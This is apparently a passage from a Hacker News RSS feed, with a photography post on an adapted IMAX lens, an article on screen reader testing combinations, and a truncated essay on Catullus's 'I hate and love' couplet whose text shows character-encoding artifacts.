<p><img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_30.png" alt="" width="1071" height="599" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_30.png 1071w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_30-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_30-768x430.png 768w" sizes="(max-width: 1071px) 100vw, 1071px">This lens has a really strange quality because my face is in focus, but the area around it is out of focus. It almost has a tilt shift kind of quality like it’s you’re focusing on one point. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_31.png" alt="" width="1072" height="599" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_31.png 1072w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_31-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_31-768x429.png 768w" sizes="(max-width: 1072px) 100vw, 1072px">When you get somebody up front like this, it gives you a blur all the way around. It’s very cool looking.</p>
<p><img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_37.png" alt="" width="1070" height="600" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_37.png 1070w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_37-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_37-768x431.png 768w" sizes="(max-width: 1070px) 100vw, 1070px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_38.png" alt="" width="1071" height="600" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_38.png 1071w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_38-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_38-768x430.png 768w" sizes="(max-width: 1071px) 100vw, 1071px"></p>
<p>I’m learning as we go along here, it doesn’t have a flat plane of focus, but I think that’s because of the way I mounted the camera back there. It’s a little bit like a tilt shift. So I didn’t get them quite square, which is kind of cool because I get the face in focus, but the hands or the body go out of focus in the foreground. It’s just kind of cool looking.</p>
<p><img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_39.png" alt="" width="1067" height="596" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_39.png 1067w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_39-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_39-768x429.png 768w" sizes="(max-width: 1067px) 100vw, 1067px"></p>
<p>One of the reasons I love to carry a light in my bag is anytime I’m doing a street portrait or something, a continuous light is so easy to flip up really fast. It gives us a little bit of light on the face and opens up the shadows. The <a href="https://bhpho.to/32nCIvK">LitraStudio</a> is perfect for that because it’s easy. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_40.png" alt="" width="1074" height="601" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_40.png 1074w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_40-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_40-768x430.png 768w" sizes="(max-width: 1074px) 100vw, 1074px">Turn it on and it’s so powerful, it’s worth the weight. It’s not like one of the little tiny ones Litra makes. I like the bigger heavier light because it just gives me so much more power. Especially in a situation like this where you have the sun to deal with.</p>
<p><img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_42.png" alt="" width="1072" height="601" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_42.png 1072w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_42-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_42-768x431.png 768w" sizes="(max-width: 1072px) 100vw, 1072px"></p>
<p>So there you have it. I’m going to do more of this. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_44.png" alt="" width="1072" height="602" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_44.png 1072w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_44-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_44-768x431.png 768w" sizes="(max-width: 1072px) 100vw, 1072px">I want to adapt some other lenses to my EOS R and just try to get weird views and that kind of gritty look. This actually was way cleaner than I thought it was going to be. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_46.png" alt="" width="1071" height="600" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_46.png 1071w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_46-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_46-768x430.png 768w" sizes="(max-width: 1071px) 100vw, 1071px">I don’t even have something blocking the light between the camera and the lens. I used just a little bit of tape in here. But it projects a great image on the sensor. It’s a little hard to focus but a lot of fun to shoot. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_48.png" alt="" width="1071" height="600" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_48.png 1071w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_48-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_48-768x430.png 768w" sizes="(max-width: 1071px) 100vw, 1071px">So I hope you enjoyed this. Make sure you subscribe to the channel and ring that bell. Keep those cameras rollin’ and keep on clickin’.</p>
<p>Check out <a href="https://bhpho.to/32nCIvK">LitraStudio lights</a>:</p>
<p><img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_50.png" alt="" width="1073" height="599" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_50.png 1073w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_50-300x167.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_50-768x429.png 768w" sizes="(max-width: 1073px) 100vw, 1073px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_51.png" alt="" width="1070" height="600" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_51.png 1070w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_51-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_51-768x431.png 768w" sizes="(max-width: 1070px) 100vw, 1070px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_52.png" alt="" width="1072" height="597" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_52.png 1072w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_52-300x167.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_52-768x428.png 768w" sizes="(max-width: 1072px) 100vw, 1072px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_53.png" alt="" width="1071" height="598" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_53.png 1071w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_53-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_53-768x429.png 768w" sizes="(max-width: 1071px) 100vw, 1071px"></p>
<!-- AddThis Advanced Settings above via filter on the_content --><!-- AddThis Advanced Settings below via filter on the_content --><!-- AddThis Advanced Settings generic via filter on the_content --><!-- AddThis Share Buttons above via filter on the_content --><!-- AddThis Share Buttons below via filter on the_content --><!-- AddThis Share Buttons generic via filter on the_content --><!-- AddThis Related Posts below via filter on the_content --><!-- AddThis Related Posts generic via filter on the_content --><!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://theslantedlens.com/2021/crazy-huge-imax-lens-amazing-street-portraits/"
    dc:identifier="https://theslantedlens.com/2021/crazy-huge-imax-lens-amazing-street-portraits/"
    dc:title="Crazy Huge Imax Lens &#8211; Amazing Street Portraits"
    trackback:ping="https://theslantedlens.com/2021/crazy-huge-imax-lens-amazing-street-portraits/trackback/" />
</rdf:RDF>-->
</div></article></div>]]>
            </description>
            <link>https://theslantedlens.com/2021/crazy-huge-imax-lens-amazing-street-portraits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25666217</guid>
            <pubDate>Thu, 07 Jan 2021 01:50:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A developer's perspective: the problem with screen reader testing]]>
            </title>
            <description>
<![CDATA[
Score 69 | Comments 52 (<a href="https://news.ycombinator.com/item?id=25665851">thread link</a>) | @jacobtracey
<br/>
January 6, 2021 | https://jaketracey.com/a-developers-perspective-the-problem-with-screen-reader-testing/ | <a href="https://web.archive.org/web/*/https://jaketracey.com/a-developers-perspective-the-problem-with-screen-reader-testing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/Article"><header><p>January 06, 2021</p></header><section itemprop="articleBody"><p>Screen readers are an essential part of using the web for people who are vision impaired, illiterate or have a learning disability.</p>
<p>Today’s screen readers traverse web pages and applications and read out user interface elements, content and allow users to navigate and interact with the web.</p>
<p>There are many screen readers available for different devices and platforms, each with differing levels of functionality, interfaces and features. The most common are JAWS, NVDA, VoiceOver and TalkBack.</p>
<p>According to the latest <a href="https://webaim.org/projects/screenreadersurvey8/">WebAIM Screen Reader User Survey</a>, when it comes to desktop screen reader usage, JAWS and NVDA are practically equal in usage, with around 40% of respondents reporting that they use one or the other.</p>
<figure>
<img src="https://jaketracey.com/webaim-graph.png" alt="Line chart of primary screen reader usage since October 2009. JAWS has steady decline from 68% to 40%. NVDA has steady incline from 3% to 41%. VoiceOver has a slow incline from 10% to 13%.">
<figcaption>Source: WebAIM</figcaption>
</figure>
<p>Based on the graph above, there’s a clear pattern over the course of the last 10 years, with NVDA usage increasing as JAWS usage drops, culminating in an inflection point in 2019 when NVDA surpassed JAWS usage for the first time.</p>
<p>As a developer regularly faced with time constraints, I have often wondered: what should be the baseline in terms of testing for screen readers, and what browser and screen reader combinations are the most important to cover in order to achieve the greatest level of WCAG compliance?</p>
<h2>An issue of time</h2>
<p>Given that almost all web applications developed in 2021 are also used on mobile and therefore require testing on both iOS and Android devices, as well as Windows and macOS for desktop users, providing adequate support for such a broad range of scenarios becomes quite difficult to manage.</p>
<p>Let’s say in a best-case scenario, a given page or feature will be tested on the following combinations:</p>
<ul>
<li>iOS / VoiceOver</li>
<li>Android / TalkBack</li>
<li>macOS / Chrome / VoiceOver</li>
<li>macOS / Safari / VoiceOver</li>
<li>macOS / Firefox / VoiceOver</li>
<li>Windows / Microsoft Edge / NVDA</li>
<li>Windows / Chrome / NVDA</li>
<li>Windows / Firefox / NVDA</li>
<li>Windows / Microsoft Edge / JAWS</li>
<li>Windows / Chrome / JAWS</li>
<li>Windows / Firefox / JAWS</li>
</ul>
<p>I should clarify that by “best-case”, I am conveniently leaving out any versions of Internet Explorer, but as frustrating as it may be, including it would add at least another 2 rounds of testing.</p>
<p>It’s also worth noting that WebAIM also recommends using Microsoft Edge with Narrator, but given its low usage, we’ll leave it out (more on this later).</p>
<p>Hypothetically, depending on the size of the functionality or page implemented, let’s say each round of testing takes one hour to complete, assuming the developer has experience with each of these browsers and screen readers.</p>
<p>In this scenario, comprehensively testing screen reader support across all these combinations adds 11 hours of development work – and that’s just to test!</p>
<h2>An issue of fragmentation</h2>
<p>Web developers will be familiar with the issues surrounding browser version fragmentation, and this problem is compounded when testing with screen readers. Contending with not only varying levels of HTML, Javascript and CSS support in the browser can be tough, and to combat this, polyfills and tools like <a href="https://caniuse.com/">caniuse.com</a> have made life a lot easier.</p>
<p>When it comes to screen reader version fragmentation, there is very little in the way of either documentation or support for developers. Fixing issues often comes down to a case of trial and error, retesting and hoping for the best.</p>
<p>A piece of information that would be incredibly useful in this area would be <em>penetration of screen reader updates</em> from the vendors. If, for instance, developers knew that there was a high adoption rate of updates among screen reader users, they could be confident that if a screen reader update resolved an issue, patches for older versions could be sunsetted. This approach has worked exceptionally well for browsers such as Chrome and Firefox.</p>
<p>Sadly, there’s not currently any way for a developer to identify the type or version of a screen reader that is being used, so implementing targeted fixes isn’t an option anyway right now.</p>
<h2>A case for dedicated accessibility testers</h2>
<p>Given the scope and time it takes to properly test across so many devices, browsers and screen readers, having dedicated accessibility testers embedded into teams can significantly increase the quality and speed with which properly accessible applications can be produced.</p>
<p>Let’s face it: developers already have a hard time keeping up with the pace of change in their own domain, let alone the level of knowledge required for comprehensive accessibility auditing.</p>
<p>That is not to say that developers should ignore accessibility completely. However, expecting someone to know about a specific bug on a particular combination of code, browser and screen reader is too much, even for the most experienced accessibility-focused developer.</p>
<h2>Why automation isn’t enough</h2>
<p>The old saying "a good programmer is a lazy programmer" comes to mind when I think about testing here. Being lazy myself (although possibly not that great of a programmer), I rely on automated tools like <a href="https://www.deque.com/axe/">axe</a> to do most of my accessibility for me. While the current range of tooling is excellent, and picks up the most obvious issues, when it comes to screen readers there’s no way around it: you need to manually test.</p>
<p>Why? Well, the current state of both browsers and screen reader support is all over the place. To highlight this, the Powermapper website has a neat <a href="https://www.powermapper.com/tests/screen-readers/aria/">list of screen reader support for WAI-ARIA attributes</a>. Not throwing shade at any one – things are continuously improving with updates to browsers and screen readers – but the point stands. Current automated testing tools are not going to catch these problems because they essentially test the validity of code, in much the same way as a code linter does.</p>
<h2>A compromise, so we can all still get stuff done</h2>
<p>Not every team has the luxury of a dedicated accessibility tester, or even a dedicated tester for that matter. Sometimes, you just need to do the best you can, with the resources that you have available.</p>
<p>"When can we stop supporting this?" has been the desperate cry of developers for years when it comes to Internet Explorer 9/10 and most recently 11, and as their usage has dropped, so has the rate of developers losing their hair trying to get their code working.</p>
<p>Which brings me back to Microsoft Edge with Narrator, as mentioned earlier. With 1% of users in that survey, and possibly 0% of users for your application or site, is it worth testing on this combination at all? More specifically, what number of users justifies support, and the testing and development overhead that comes with it?</p>
<h3>Windows - Chrome (latest version), NVDA</h3>
<p>As of December 2020, Chrome is by far the most popular browser in the world, with 65.3% of users. Later versions of Microsoft Edge utilize the same rendering engine, so there is a high likelihood that if it works in Chrome, it will work similarly in Edge.</p>
<p>Based on the WebAIM stats, it is a safe bet that NVDA will begin to increase its lead over JAWS over the next few years. Given that it is also open-source and free, I can’t help but draw a comparison to the way Firefox overtook Internet Explorer in the 2000s browser wars.</p>
<h3>macOS - Safari (latest version), VoiceOver</h3>
<p>Safari is a fair distance behind Chrome in terms of users, with 16.7% share as of writing, but it has the benefit of being the default browser in macOS. It is also free, and the support for accessibility features with VoiceOver is second to none. In addition to this, because of the similarity with its mobile counterpart, most likely any issues that are identified in the desktop version will have similar fixes.</p>
<h3>iOS - Safari (latest version), VoiceOver</h3>
<p>Safari is by far the most popular browser on iOS and all other browsers on iOS use the WebKit rendering engine. VoiceOver is the gold standard for mobile screen readers (and the only option for iOS devices), and as such it makes sense to use this combination for testing iOS accessibility.</p>
<h3>Android - Chrome (latest version), TalkBack</h3>
<p>In a similar vein to iOS, being the default browser and screen reader combination for Android makes this a simple choice, as it will cover the vast majority of users on this platform. Although manufacturers do include their own browsers and there are quite a few other options on Android, the vast majority of the time they use the inbuilt rendering engine, so the expectation in terms of accessibility should be similar, if not identical, to the Chrome experience.</p>
<p>This is by no means a catch-all solution for everyone. Each circumstance will be different, and the best course of action would be to engage your users and ask rather than trying to make the decision for them.</p>
<p>The reality is that if your site or application’s design or functionality looks bad or works poorly for a large enough number of your users because it does not support the software that they use, it can have potential ramifications to your business, through sales or reputation. Similarly, poor accessibility will have a negative impact if your users are using older versions of screen readers and browser combinations.</p>
<h2>But what about JAWS, ZoomText, System Access, <em>insert screen reader here</em>?</h2>
<p>At the risk of being slightly incendiary, I dislike the idea of paying for something that I can get for free. NVDA is a project that has brought screen readers to everybody – including those without the financial means to pay for it – so I support it. Along with the clear trajectory of its usage uptake, it is not unreasonable to expect that the majority of users will adopt it in the next 5 to 10 years.</p>
<p>At the end of the day, however, your best bet when it comes to identifying where your testing efforts should be placed is to talk to your users to find out what their needs are and what software they use. If you don’t have access to this information, the proposed testing scope above will suffice for the vast majority of your site or application’s users, and most likely will continue to do so in the years to come.</p></section></article></div>]]>
            </description>
            <link>https://jaketracey.com/a-developers-perspective-the-problem-with-screen-reader-testing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25665851</guid>
            <pubDate>Thu, 07 Jan 2021 01:12:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A 1996 Interview with Donald Knuth – On programmer vs. scientist, Dijkstra, C++ [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25665674">thread link</a>) | @eric_cartman
<br/>
January 6, 2021 | http://www.ntg.nl/maps/16/14.pdf | <a href="https://web.archive.org/web/*/http://www.ntg.nl/maps/16/14.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.ntg.nl/maps/16/14.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25665674</guid>
            <pubDate>Thu, 07 Jan 2021 00:57:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Takedown of Anna Wiener's Uncanny Valley]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25665352">thread link</a>) | @botoxparty
<br/>
January 6, 2021 | https://min.report/sally-olds/bourgeois-see-bourgeois-do | <a href="https://web.archive.org/web/*/https://min.report/sally-olds/bourgeois-see-bourgeois-do">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://min.report/sally-olds/bourgeois-see-bourgeois-do</link>
            <guid isPermaLink="false">hacker-news-small-sites-25665352</guid>
            <pubDate>Thu, 07 Jan 2021 00:38:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Love’s contradictions: Catullus on the agony of infatuation]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25664867">thread link</a>) | @diodorus
<br/>
January 6, 2021 | https://psyche.co/ideas/loves-contradictions-catullus-on-the-agony-of-infatuation | <a href="https://web.archive.org/web/*/https://psyche.co/ideas/loves-contradictions-catullus-on-the-agony-of-infatuation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><blockquote>I hate and love. If you ask me to explain<br>The contradiction,<br>I canâ€™t, but I can feel it, and the pain<br>Is crucifixion.</blockquote>
<blockquote> <em>Odi et amo: quare id faciam fortasse requiris.</em><br><em>Nescio, sed fieri sentio et excrucior.</em> </blockquote>
<p><strong>This simple but heartfelt</strong> couplet (translation above by James Michie in 1969) is the best-known Latin love epigram â€“ a short poem in elegiac metre â€“ that survives from Ancient Rome. Composed by the poet Catullus around <span>55 BCE,</span> <span>number 85</span> of his book of <span>116 poems,</span> it pithily encapsulates the searing conflict of emotions that he claims to be experiencing in the course of his affair with a younger married woman, who is addressed in other poems as his â€˜girlâ€™ (<em>puella</em>) and by the pseudonym â€˜Lesbiaâ€™. But for such a short poem â€“ just 14 words in Latin â€“ it has raised a whole host of questions, and hundreds of pages have been written about it. What is the point of the poem? How should it be translated from the Latin? How does it relate to the poetâ€™s life and feelings? Its psychology comes across as complex and strikingly modern, as does much of Catullusâ€™s poetry; to some, the questions it raises might seem more suited to a post-FreudÂ­ian examination of mental conflict than to the concerns of an ancient poet. We might recognise that the opposite emotions of love and hate can be simultaneously entertained; but how, after all, does that work?</p>
<p>In its original Latin, <span>Poem 85</span> is a so-called elegiac couplet, in which a longer line (hexameter) is followed by a shorter one (pentameter). The words of the poem have been placed with care. The couplet is composed in a criss-cross pattern, beginning and ending with two verbs of intense emotional connotation: <em>odi</em>, â€˜I hateâ€™; and <em>excrucior</em>, â€˜Iâ€™m rackedâ€™. The first line concludes with the questÂ­ioning <em>requiris</em>, â€˜you askâ€™; the second opens with the answer <em>nescio</em>, â€˜I donâ€™t knowâ€™. The middle of the first line has <em>faciam</em>, â€˜I doâ€™; the middle of the second has its passive counterÂ­part <em>fieri</em>, â€˜is being doneâ€™ (related to <em>fiat</em> â€“ literally, â€˜let it be doneâ€™).</p>
<p>The couplet thus mimics by its shape the image of the poet being pulled apart in opposite directions, an image made explicit by the verb <em>excrucior</em>. That word (the root of our â€˜excruciatingâ€™) will have evoked for Romans the noun <em>crux</em> (plural <em>cruces</em>). Although in the <span>1st millennium CE</span> <em>crux</em> came to be heard almost exclusively to mean â€˜crossâ€™ with reference to the crucifixion of Christ, in CatullÂ­usâ€™s time it was more commonly used to signify the â€˜rackâ€™. This was the standard instrument of torture in the Roman world, to which unfortÂ­unate victims were bound by their hands and legs so that their bodies might literally be pulled apart.</p>
<p>While Catullus remains utterly infatuated with Lesbia, she has proved to be <br>distressÂ­ingly fickle to him</p>
<p>No less cruel and visible as a method of executÂ­ion in the Roman world was crucifixion. Catullus was in his teens when in <span>71 BCE</span> the slave-revolt led by Spartacus was quelled, and he would probably have witnessed at first hand the gruesome sight of 6,000 captured slaves being nailed or strung up to die on wooden crosses along the Appian Way leading from Rome to Capua. WhatÂ­ever the precise image intended by Catullus as a parallel to his own feeling of torment, what is evident is that the combination of hate and love, pulling him in different directions, is making him feel as if he is being â€˜racked to deathâ€™: the <em>ex</em> of <em>excrucÂ­ior</em> connotes a process leading towards expiry and extinction, as well as extenÂ­sion â€“ both in time and across space. Moreover, Catullus claims, thereâ€™s nothing he can <em>do</em> about it: heâ€™s simply the object of this torturous and self-contradictory feeling. His response to someone who might wish to enquire (<em>requiÂ­ris</em>) about what heâ€™s â€˜doingâ€™ (<em>faciam</em>) is that heâ€™s not â€˜doingâ€™ anything, but that he senses (<em>sentio</em>) it â€˜being doneâ€™ (<em>fieri</em>) to him: the passive form of the verb corresÂ­ponds to his own passivÂ­ity in the process heâ€™s describing.</p>
<p>However, just before Catullus presents himself as the helpless victim of opposing emotÂ­ions, the answer he gives to the imagined question is unequivocal: â€˜I donâ€™t knowâ€™. The implication of <em>nescio</em> (the negative of <em>scio</em>, â€˜knowâ€™, whence comes our word â€˜scienceâ€™) has been overlooked by generations of translators from the Latin, who have rendered the word <em>quare</em> as â€˜whyâ€™ or â€˜the reason whyâ€™ rather than â€˜howâ€™ â€“ even though itâ€™s clear that Catullus does know, as do his readÂ­ers, why or for what reason heâ€™s prey to emotional conflict. For instance, one of the poemâ€™s earliest English transÂ­lators, the poet Richard Lovelace (1617-57), renders it as:</p>
<blockquote>I hate and love; wouldâ€™st thou the reason know?<br>I know not, but I burn, and feel it so.</blockquote>
<p>Similarly, the translator in the popular Loeb series, which prints classical texts with facing versions in straightforward English, in 1976 had it as:</p>
<blockquote>I hate and love. Why I do so, perhaps you ask? <br>I know not, but I feel it, and I am in torment.</blockquote>
<p>Such translations using â€˜whyâ€™ followed by â€˜I donâ€™t knowâ€™ ask us to suppÂ­ose that Catullus is claiming an inability to understand the reason for his painful emotional turmoil. Yet the poet has already made it abundantly clear, in several other poems describing his affair with Lesbia, that he knows the reason only too well: while he remains utterly infatuated with her, she has proved distressÂ­ingly fickle to him, willing to be unfaithful not only to her husband but to her adultÂ­erous liaison with the poet too. In <span>Poem 72</span> (my translation), Catullus analyses the effect on him of Lesbiaâ€™s infidelity:</p>
<blockquote>You used to say you had eyes for Catullus alone, <br>Lesbia, and would rather hold me in your arms than Jove. <br>My feelings for you then were not just vulgar lust,<br>but the kind of love a father feels for his children and their kin. <br>Now that I know your ways, my desire for you burns ever fiercer,<br>even though youâ€™re far shabbier in my eyes, and flightier. <br>How can this be, you say: itâ€™s because such hurtful treatment <br>is bound to make one desire oneâ€™s lover more, but like them less.</blockquote>
<p>How is it possible, in terms of logic or emotion, to feel both hate and love towards the same person at the same time?</p>
<p>In the final couplet here, Catullus explains to the reader, in terms very similar to those he uses in <span>Poem 85,</span> the paradox of his feelings. The enquirer doesnâ€™t need to ask the cause of the poetâ€™s pain, here described as <em>iniuria</em> (â€˜hurtful treatmentâ€™) because itâ€™s easy to understand: Catullus is wounded by Lesbiaâ€™s sexual intimacy with other lovers and hotly resents her behaviour; but his desire for her, perhaps intensified by the prospect of losing her to a love-rival, is even stronger.</p>
<p><strong>The reader might still </strong>ask how such divergent feelings as love and dislike can coexist in a lover and be directed towards the same object â€“ indeed, the final line above describes someÂ­thing that feels like such an emotional contradiction, the combinÂ­ation of desire with disliking. That divergence is, in <span>Poem 85,</span> yet more starkly expressed with â€˜I hate and loveâ€™ (rendered more emphatically in translations that repeat the â€˜Iâ€™: â€˜I hate and I loveâ€™). But, again, Catullus would expect the reader to ask not â€˜whyâ€™, but â€˜howâ€™; that is, how is it possible, whether in terms of logic or emotion, for someone to feel both hate and love towards the same person at the same time? Since Catullus knows, as do his readers, <em>why</em> heâ€™s prey to these contradictory feelings, only in answer to the question â€˜howâ€™ can it be reasonable for him to follow up, as he does, with â€˜I donâ€™t knowâ€™. Having declared his ignorance of how the perplexing phenomenon of simultaneous opposing emotions can arise, he then abandons analysis and simply testifies to his own torment.</p>
<p>The correctness of the translation of <em>quare</em> as â€˜howâ€™ is confirmed by lexical data. In Catullusâ€™s time and before (as found, for example, in passages written by Catullusâ€™s older contempÂ­orary, the orator Cicero) <em>quare</em> is used to mean â€˜howâ€™ or â€˜in what wayâ€™. It comes to mean â€˜whyâ€™ in the course of the languageâ€™s histÂ­Â­ory; but given the compelling contextual and linguistic arguments for the understanding of what Catullus is asking in <span>Poem 85,</span> what explanation can there be for the persistÂ­ent mistranslation of <em>quare</em> as â€˜whyâ€™ rather than as â€˜howâ€™ in English? (TransÂ­lations into other languages such as Italian, German and French also tend to fluctuate between rendering <em>quare</em> as â€˜whyâ€™ and â€˜howâ€™).</p>
<p>One answer must be that translators have been influenced by a later Latin couplet thatâ€™s as famous as Catullusâ€™s, and indeed alludes to it. A satirical squib <span>(number 32)</span> composed by the poet Martial in the late <span>1st century CE,</span> more than <span>100 years</span> after Catullusâ€™s death, uses the same couplet form:</p>
<blockquote>I donâ€™t like you, Sabidius, and Iâ€™m unable to say why:<br>All I can say is this: I donâ€™t like you.</blockquote>
<blockquote> <em>Non amo te, Sabidi, nec possum dicere quare: </em><br><em>Hoc tantum possum dicere: non amo te</em>.</blockquote>
<p>Nothing is known of the context of the epigram or of the implied feud between the poet and the otherwise unknown Sabidius. But the poem has won a firm, if anecdotal, place in the annals of Latin studies in England. The story (undoubÂ­tedly apocryphal) is told how, as a student at Christ Church College, Oxford, the writer Thomas Brown (1662-1704) committed a misdeÂ­meanour and was sent for punishment to the college dean, a <span>Dr Fell.</span> The dean required Brown to transÂ­late some Latin verse on the spot, and opened a book of epigrams at random to present him with Martialâ€™s couplet. After a momentâ€™s thought, Brown recited, allegedly to the deanâ€™s delight, his witty and memorable version of the poem:</p>
<blockquote>I do not like thee, Doctor Fell, <br>The reason why I cannot tell; <br>But this I know, and know full well, <br>I do not like thee, Doctor Fell.</blockquote>
<p>In the case of Martialâ€™s epigram, â€˜the reason whyâ€™ is a …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/ideas/loves-contradictions-catullus-on-the-agony-of-infatuation">https://psyche.co/ideas/loves-contradictions-catullus-on-the-agony-of-infatuation</a></em></p>]]>
            </description>
            <link>https://psyche.co/ideas/loves-contradictions-catullus-on-the-agony-of-infatuation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25664867</guid>
            <pubDate>Thu, 07 Jan 2021 00:15:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Defending Journalism to Defend the Republic]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25664719">thread link</a>) | @jaredwiener
<br/>
January 6, 2021 | https://blog.nillium.com/defending-journalism-to-defend-the-republic/ | <a href="https://web.archive.org/web/*/https://blog.nillium.com/defending-journalism-to-defend-the-republic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 300w,
                            https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 600w,
                            https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 1000w,
                            https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Defending Journalism to Defend the Republic">
            </figure>

            <section>
                <div>
